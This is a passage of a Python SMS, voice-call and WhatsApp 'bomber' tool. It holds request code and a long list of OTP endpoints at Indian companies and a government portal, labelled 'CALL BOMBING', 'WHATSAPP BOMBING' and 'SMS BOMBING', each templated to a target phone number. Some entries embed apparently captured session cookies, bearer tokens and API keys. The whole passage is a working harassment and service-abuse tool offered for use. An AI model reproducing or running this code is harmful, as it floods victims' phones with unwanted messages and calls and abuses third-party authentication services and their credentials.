                'Authorization': 'Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiI4ZGU0N2UwNy1mMDI0LTRlMTUtODMzNC0zOGMwNmFlMzNkNmEiLCJ1bmlxdWVfYXNzaWduZWRfbnVtYmVyIjoiYjViMWVmNGQtZGI0MS00NzExLThjMjAtMGU4NjQyZDBlMDJiIiwiY3JlYXRlZF90aW1lIjoiMDcgT2N0b2JlciwgMjAyNSB8IDA5OjQzOjExIEFNIiwiZXhwaXJlZF90aW1lIjoiMDcgT2N0b2JlciwgMjAyNSB8IDA5OjU4OjExIEFNIiwiaWF0IjoxNzU5ODEwMzkxLCJpc3MiOiI4ZGU0N2UwNy1mMDI0LTRlMTUtODMzNC0zOGMwNmFlMzNkNmEiLCJhdWQiOiJodHRwczovL2hvc3QtdXJsIiwiZXhwIjoxNzU5ODExMjkxfQ.N8a-NMFqmgO0vtY9Bp14EF22Jo3bMEB4n_OlcgwF3RZdIJDg5ZwC_WFc1aI-AU7BdWjpfrEc52ZSsfQ73S8pnY8RePnJrKqmE61vdWRY37VAULvD99eMl2AS7W2lEdE5EZoGGM2WqBuTzW8aO5QIt98deWDSyK9xG0v4tfbYG0469g7mOOpeCAuZC3gTIKZ93k7aHyMcf5FPjSsfIdNxqmdW0IrRx6bOdyr_w3AmYheg4aNNfMi5bc6fu_eKXABuwC9O420CFai9TIkImUEqr8Rxy4Sfe7aFVTN6DB8Fv_J1i7GBgCa3YX0VfZiGpVowXmcTqJQcGSiH4uZVRsmf3g',
                'Connection': 'keep-alive',
                'Content-Type': 'application/json',
                'Origin': 'https://oneservice.adityabirlacapital.com',
                'Referer': 'https://oneservice.adityabirlacapital.com/login',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0',
                'authToken': 'eyJraWQiOiJLY2NMeklBY3RhY0R5TWxHVmFVTm52XC9xR3FlQjd2cnNwSWF3a0Z0M21ZND0iLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJzcGRsN2xobHI4ZDkxNm1qcDNyaWt1dGNlIiwidG9rZW5fdXNlIjoiYWNjZXNzIiwic2NvcGUiOiJhdXRoXC9zdmNhcHAiLCJhdXRoX3RpbWUiOjE3NTk4MDcyNDEsImlzcyI6Imh0dHBzOlwvXC9jb2duaXRvLWlkcC5hcC1zb3V0aC0xLmFtYXpvbmF3cy5jb21cL2FwLXNvdXRoLTFfd2h3N0dGb0oxIiwiZXhwIjoxNzU5ODE0NDQxLCJpYXQiOjE3NTk4MDcyNDEsInZlcnNpb24iOjIsImp0aSI6IjVjNTM1ODkxLTBiZjItNDk3ZS04ZTZiLWNkZWZiNzA0OGY1YyIsImNsaWVudF9pZCI6InNwZGw3bGhscjhkOTE2bWpwM3Jpa3V0Y2UifQ.noVIL6Tks0NHZwCmokdjx4hpXntkuNQQjPglIwk-4qG6_DzqmJkYxRkH_ekYxbP0kiWpQp4iDLZasiiP5EIlAXgGZHEY5dEf0jAaiIl8EEGtj4VkUV46njil4LOBFCxsdNfJ-i4hO6iCBddwXu_6OMWJArERdPlg6cpej_y91aPe-UjSuaHexSTmtdzoTRGnZw5W57uiVRZwY3iCPjLWEY-8Qj9a0HqSwTg7oNvOOMac5hCif4IoCNCMP8VoR4F-EttDdWpqW3hETGE6VBMU8R3rY2Q-Vm4CB2VdbToSGtjxFwuMq66OMpVM_G7Fq478JgPhmv9sb85bo2jto8gvow',
                'browser': 'Microsoft Edge',
                'browserVersion': '141.0',
                'csUserId': 'CS6GGNB62PFDLHX6',
                'loginSource': '26',
                'pageName': '/login',
                'source': '151',
                'traceId': 'CSNwb9nPLzWrVfpl'
            }
            data = {'request': 'CepT08jilRIQiS1EpaNsQVXbRv3PS/eUQ1lAbKfLJuUNvkkemX01P9n5tJiwyfDP3eEXRcol6uGvIAmdehuWBw=='}
            response = session.post('https://oneservice.adityabirlacapital.com/apilogin/onboard/generate-otp', headers=headers, cookies=cookies, json=data, timeout=5)
            return response.status_code == 200

        # 28: Pinknblu
        elif lim == 28:
            cookies = {
                '_ga': 'GA1.1.1922530896.1759808413',
                '_gcl_au': '1.1.178541594.1759808413',
                '_fbp': 'fb.1.1759808414134.913709261257829615',
                'laravel_session': 'eyJpdiI6IllNM0Z5dkxySUswTlBPVjFTN09KMkE9PSIsInZhbHVlIjoiT1pXQWxLUVdYNXJ0REJmU3Q5R0EzNWc5cGJHbzVsaG5oWjRweFRTNG9cL2l4MHdXUVdTWEFtbEsybDdvTjAyazN4dERkdEsrMlBQeTdYUTR4RXNhNWM5WDlrZGtqOEk2eEVcL1BUUEhoN0F4YjJGTWZKd0tcL2JaQitXZmxWWjRcL0hXIiwibWFjIjoiMTNlZDhlNzM2MmIyMzRlODBlNWU0NTJkYjdlOTY5MmJhMzAzM2UyZjEwODAwOTk5Mzk1Yzc3ZTUyZjBhM2I4ZSJ9',
                '_ga_8B7LH5VE3Z': 'GS2.1.s1759808413$o1$g1$t1759809854$j30$l0$h1570660322',
                '_ga_S6S2RJNH92': 'GS2.1.s1759808413$o1$g1$t1759809854$j30$l0$h0'
            }
            headers = {
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://pinknblu.com',
                'Referer': 'https://pinknblu.com/',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0',
                'X-Requested-With': 'XMLHttpRequest',
                'sec-ch-ua': '"Microsoft Edge";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"'
            }
            data = {
                '_token': 'fbhGqnDcF41IumYCLIyASeXCntgFjC9luBVoSAcb',
                'country_code': f'+{cc}',
                'phone': pn
            }
            response = session.post('https://pinknblu.com/v1/auth/generate/otp', headers=headers, cookies=cookies, data=data, timeout=5)
            return response.status_code == 200 or '"status":"success"' in response.text.lower()

        # 29: Udaan
        elif lim == 29:
            cookies = {
                'gid': 'GA1.2.153419917.1759810454',
                'sid': 'AVr5misBh4gBAIMSGSayAIeIHvwJYsleAXWkgb87eYu92RyIEsDTp7Wan8qrnUN7IeMj5JEr1bpwY95aCuF1rYO/',
                'WZRK_S_8R9-67W-W75Z': '%7B%22p%22%3A1%7D',
                'mp_a67dbaed1119f2fb093820c9a14a2bcc_mixpanel': '%7B%22distinct_id%22%3A%22%24device%3Ac4623ce0-2ae9-45d3-9f83-bf345b88cb99%22%2C%22%24device_id%22%3A%22c4623ce0-2ae9-45d3-9f83-bf345b88cb99%22%2C%22%24initial_referrer%22%3A%22https%3A%2F%2Fudaan.com%2F%22%2C%22%24initial_referring_domain%22%3A%22udaan.com%22%2C%22mps%22%3A%7B%7D%2C%22mpso%22%3A%7B%22%24initial_referrer%22%3A%22https%3A%2F%2Fudaan.com%2F%22%2C%22%24initial_referring_domain%22%3A%22udaan.com%22%7D%2C%22mpus%22%3A%7B%7D%2C%22mpa%22%3A%7B%7D%2C%22mpu%22%3A%7B%7D%2C%22mpr%22%3A%5B%5D%2C%22_mpap%22%3A%5B%5D%7D',
                '_ga_VDVX6P049R': 'GS2.1.s1759810459$o1$g0$t1759810459$j60$l0$h0',
                '_ga': 'GA1.1.803417298.1759810454'
            }
            headers = {
                'accept': '/*',
                'accept-language': 'en-IN',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'origin': 'https://auth.udaan.com',
                'referer': 'https://auth.udaan.com/login/v2/mobile?cid=udaan-v2&cb=https%3A%2F%2Fudaan.com%2F_login%2Fcb&v=2',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0',
                'x-app-id': 'udaan-auth'
            }
            data = {'mobile': pn}
            url = 'https://auth.udaan.com/api/otp/send?client_id=udaan-v2&whatsappConsent=true'
            response = session.post(url, headers=headers, cookies=cookies, data=data, timeout=5)
            return response.status_code == 200 or 'success' in response.text.lower()

        # 30: Nuvama Wealth
        elif lim == 30:
            headers = {
                'api-key': 'c41121ed-b6fb-c9a6-bc9b-574c82929e7e',
                'Referer': 'https://onboarding.nuvamawealth.com/',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0',
                'Content-Type': 'application/json'
            }
            data = {"contactInfo": pn, "mode": "SMS"}
            response = session.post('https://nwaop.nuvamawealth.com/mwapi/api/Lead/GO', headers=headers, json=data, timeout=5)
            return response.status_code == 200 or 'success' in response.text.lower()

        return False

    except requests.exceptions.RequestException:
        return False
    except Exception:
        return False


# ================================================================
#                     NEW APIS (from ANURAGXNOTHING + Gaurav)
# ================================================================

ULTIMATE_APIS = [
    # CALL BOMBING APIS (12)
    {
        "name": "Tata Capital Voice Call",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}'
    },
    {
        "name": "1MG Voice Call", 
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}'
    },
    {
        "name": "Swiggy Call Verification",
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", 
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Myntra Voice Call",
        "url": "https://www.myntra.com/gw/mobile-auth/voice-otp",
        "method": "POST", 
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Flipkart Voice Call",
        "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Amazon Voice Call",
        "url": "https://www.amazon.in/ap/signin",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&action=voice_otp"
    },
    {
        "name": "Paytm Voice Call",
        "url": "https://accounts.paytm.com/signin/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Zomato Voice Call",
        "url": "https://www.zomato.com/php/o2_api_handler.php",
        "method": "POST", 
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&type=voice"
    },
    {
        "name": "MakeMyTrip Voice Call",
        "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Goibibo Voice Call",
        "url": "https://www.goibibo.com/user/voice-otp/generate/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Ola Voice Call",
        "url": "https://api.olacabs.com/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Uber Voice Call",
        "url": "https://auth.uber.com/v2/voice-otp", 
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },

    # WHATSAPP BOMBING APIS (6)
    {
        "name": "KPN WhatsApp",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        "method": "POST", 
        "headers": {
            "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
            "content-type": "application/json; charset=UTF-8"
        },
        "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}'
    },
    {
        "name": "Foxy WhatsApp",
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}},"via":"whatsapp"}}'
    },
    {
        "name": "Stratzy WhatsApp", 
        "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNo":"{phone}"}}'
    },
    {
        "name": "Jockey WhatsApp",
        "url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Rappi WhatsApp",
        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}'
    },
    {
        "name": "Eka Care WhatsApp",
        "url": "https://auth.eka.care/auth/init",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=UTF-8"},
        "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}'
    },

    # SMS BOMBING APIS (77 from original list + 1 new = 78)
    {
        "name": "Lenskart SMS",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}'
    },
    {
        "name": "NoBroker SMS",
        "url": "https://www.nobroker.in/api/v3/account/otp/send", 
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&countryCode=IN"
    },
    {
        "name": "PharmEasy SMS",
        "url": "https://pharmeasy.in/api/v2/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Wakefit SMS",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Byju's SMS",
        "url": "https://api.byjus.com/v2/otp/send",
        "method": "POST", 
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Hungama OTP",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'
    },
    {
        "name": "Meru Cab",
        "url": "https://merucabapp.com/api/otp/generate", 
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobile_number={phone}"
    },
    {
        "name": "Doubtnut",
        "url": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "headers": {"content-type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}'
    },
    {
        "name": "PenPencil",
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST", 
        "headers": {"content-type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'
    },
    {
        "name": "Snitch",
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}'
    },
    {
        "name": "Dayco India",
        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp"
    },
    {
        "name": "BeepKart",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","city":362}}'
    },
    {
        "name": "Lending Plate",
        "url": "https://lendingplate.com/api.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"mobiles={phone}&resend=Resend"
    },
    {
        "name": "ShipRocket",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'
    },
    {
        "name": "GoKwik",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country":"in"}}'
    },
    {
        "name": "NewMe",
        "url": "https://prodapi.newme.asia/web/otp/request",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"{phone}","resend_otp_request":true}}'
    },
    {
        "name": "Univest",
        "url": lambda phone: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Smytten",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","email":"test@example.com"}}'
    },
    {
        "name": "CaratLane",
        "url": "https://www.caratlane.com/cg/dhevudu",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"query":"mutation {{SendOtp(input: {{mobile: \\"{phone}\\",isdCode: \\"91\\",otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}"}}'
    },
    {
        "name": "BikeFixup",
        "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=UTF-8"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"4pFtQJwcz6y"}}'
    },
    {
        "name": "WellAcademy",
        "url": "https://wellacademy.in/store/api/numberLoginV2",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=UTF-8"},
        "data": lambda phone: f'{{"contact_no":"{phone}"}}'
    },
    {
        "name": "ServeTel",
        "url": "https://api.servetel.in/v1/auth/otp",
        "method": "POST", 
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"},
        "data": lambda phone: f"mobile_number={phone}"
    },
    {
        "name": "GoPink Cabs",
        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"check_mobile_number=1&contact={phone}"
    },
    {
        "name": "Shemaroome",
        "url": "https://www.shemaroome.com/users/resend_otp", 
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"mobile_no=%2B91{phone}"
    },
    {
        "name": "Cossouq",
        "url": "https://www.cossouq.com/mobilelogin/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobilenumber={phone}&otptype=register"
    },
    {
        "name": "MyImagineStore",
        "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"mobile={phone}"
    },
    {
        "name": "Otpless",
        "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","selectedCountryCode":"+91"}}'
    },
    {
        "name": "MyHubble Money",
        "url": "https://api.myhubble.money/v1/auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"{phone}","channel":"SMS"}}'
    },
    {
        "name": "Tata Capital Business",
        "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"{phone}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}}'
    },
    {
        "name": "DealShare",
        "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","hashCode":"k387IsBaTmn"}}'
    },
    {
        "name": "Snapmint",
        "url": "https://api.snapmint.com/v1/public/sign_up",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Housing.com",
        "url": "https://login.housing.com/api/v2/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}'
    },
    {
        "name": "RentoMojo",
        "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Khatabook",
        "url": "https://api.khatabook.com/v1/auth/request-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}'
    },
    {
        "name": "Netmeds",
        "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Nykaa",
        "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"source=sms&app_version=3.0.9&mobile_number={phone}&platform=ANDROID&domain=nykaa"
    },
    {
        "name": "RummyCircle",
        "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","isPlaycircle":false}}'
    },
    {
        "name": "Animall",
        "url": "https://animall.in/zap/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}}'
    },
    {
        "name": "PenPencil V3",
        "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Entri",
        "url": "https://entri.app/api/v3/users/check-phone/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Cosmofeed",
        "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","version":"1.4.28"}}'
    },
    {
        "name": "Aakash",
        "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"{phone}","activity_type":"aakash-myadmission"}}'
    },
    {
        "name": "Revv",
        "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","deviceType":"website"}}'
    },
    {
        "name": "DeHaat",
        "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","client_id":"kisan-app"}}'
    },
    {
        "name": "A23 Games",
        "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","device_id":"android123","model":"Google,Android SDK built for x86,10"}}'
    },
    {
        "name": "Spencer's",
        "url": "https://jiffy.spencers.in/user/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "PayMe India",
        "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"S10ePIIrbH3"}}'
    },
    {
        "name": "Shopper's Stop",
        "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","type":"SIGNIN_WITH_MOBILE"}}'
    },
    {
        "name": "Hyuga Auth",
        "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "BigCash",
        "url": lambda phone: f"https://www.bigcash.live/sendsms.php?mobile={phone}&ip=192.168.1.1",
        "method": "GET",
        "headers": {"Referer": "https://www.bigcash.live/games/poker"},
        "data": None
    },
    {
        "name": "Lifestyle Stores",
        "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"signInMobile":"{phone}","channel":"sms"}}'
    },
    {
        "name": "WorkIndia",
        "url": lambda phone: f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={phone}&version_number=623",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "PokerBaazi",
        "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","mfa_channels":"phno"}}'
    },
    {
        "name": "My11Circle",
        "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json;charset=UTF-8"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "MamaEarth",
        "url": "https://auth.mamaearth.in/v1/auth/initiate-signup",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "HomeTriangle",
        "url": "https://hometriangle.com/api/partner/xauth/signup/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Wellness Forever",
        "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"method=firstRegisterApi&data={{\"customerMobile\":\"{phone}\",\"generateOtp\":\"true\"}}"
    },
    {
        "name": "HealthMug",
        "url": "https://api.healthmug.com/account/createotp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Vyapar",
        "url": lambda phone: f"https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Kredily",
        "url": "https://app.kredily.com/ws/v1/accounts/send-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Tata Motors",
        "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","sendOtp":"true"}}'
    },
    {
        "name": "Moglix",
        "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","buildVersion":"24.0"}}'
    },
    {
        "name": "MyGov",
        "url": lambda phone: f"https://auth.mygov.in/regapi/register_api_ver1/?&api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&name=raj&email=&gateway=91&mobile={phone}&gender=male",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "TrulyMadly",
        "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","locale":"IN"}}'
    },
    {
        "name": "Apna",
        "url": "https://production.apna.co/api/userprofile/v1/otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","hash_type":"play_store"}}'
    },
    {
        "name": "CodFirm",
        "url": lambda phone: f"https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{phone}&email=&storeUrl=bellavita1.myshopify.com",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Swipe",
        "url": "https://app.getswipe.in/api/user/mobile_login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","resend":true}}'
    },
    {
        "name": "More Retail",
        "url": "https://omni-api.moreretail.in/api/v1/login/",
